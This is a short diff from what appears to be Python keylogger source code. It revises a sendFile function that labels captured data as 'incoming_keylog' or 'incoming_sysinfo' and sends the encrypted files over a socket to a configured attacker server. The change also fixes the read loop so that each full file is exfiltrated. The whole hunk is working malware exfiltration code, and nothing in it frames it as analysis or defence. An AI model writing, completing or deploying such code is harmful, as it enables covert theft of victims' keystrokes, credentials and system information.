@@ -37,13 +37,19 @@ extend = "\\"
 extendedPath = path + extend
 
 
-### sends encrypted files ###
-def sendFile(filename):
+### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+def sendFile(filename, isSysInfo):
     clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    f = open (filename, 'rb')
+    f = open(filename, 'rb')
+    if (not isSysInfo):
+        sent_data = "incoming_keylog"
+    else:
+        sent_data = "incoming_sysinfo"
+    clientsocket.send(sent_data.encode())
     l = f.read(buffer_size)
-    while(l):
+    while (l):
         clientsocket.sendto(l.encode(), (server_ip, udpPort))
+        l = f.read(buffer_size)
     f.close()
     clientsocket.close()
 
